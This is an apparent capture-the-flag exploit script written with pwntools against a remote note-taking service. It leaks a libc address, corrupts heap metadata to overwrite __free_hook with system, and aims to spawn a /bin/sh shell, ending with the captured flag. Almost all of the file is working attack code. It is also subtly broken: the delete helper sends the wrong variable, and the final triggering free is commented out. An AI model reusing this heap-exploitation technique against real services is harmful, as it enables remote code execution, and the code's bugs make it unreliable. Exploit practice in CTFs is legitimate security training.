from pwn import *

p = remote('34.81.158.137', 10102)

def create(name, length, note):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Name: ')
    p.send(name)
    p.recvuntil(b'length: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'Note: ')
    p.send(note)

def show():
    p.recvuntil(b'> ')
    p.sendline(b'2')

def edit(id, name, note):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'ID: ')
    p.sendline(str(id).encode())
    p.recvuntil(b'Name: ')
    p.send(name)
    p.recvuntil(b'): ')
    p.send(note)

def delete(idx):
    p.recvuntil(b'> ')
    p.sendline(b'4')
    p.recvuntil(b'ID: ')
    p.sendline(str(id).encode())

pcap_tmpbin_leak = 0x7fcb44cc4b61
pcap_puts = 0x7fcb44b605a0
pcap_free_hook = 0x7fcb44cc7b28
puts_off = 0x0875a0
system_off = 0x055410

create(b'n1', 0x480, b'a') # 0
create(b'n2', 0x480, b'a') # 1
delete(0)
create(b'n3', 0x480, b'a') # 0
show()
p.recvuntil(b'0: n3 - ')
leak = u64(p.recv(6).ljust(8, b'\x00'))
print(hex(leak))
libc_base = leak - pcap_tmpbin_leak + pcap_puts - puts_off
print(hex(libc_base))
system = libc_base + system_off
free_hook = libc_base + 0x1eeb28

create(b'o1', 0x20, b'o1') # 2
create(b'o2', 0x20, b'o2') # 3
edit(2, b'a' * 0x10 + b'\xff', b'a' * 0x28 + p64(0x31) + b'n' * 0x10 + p64(0x20) + p64(free_hook))
edit(3, b'o2', p64(system))
create(b'/bin/sh\x00', 0x40, b'/bin/sh\x00')
# delete(4) # 4

p.interactive()

# TSJ{JustASimpleNoteChallenge.}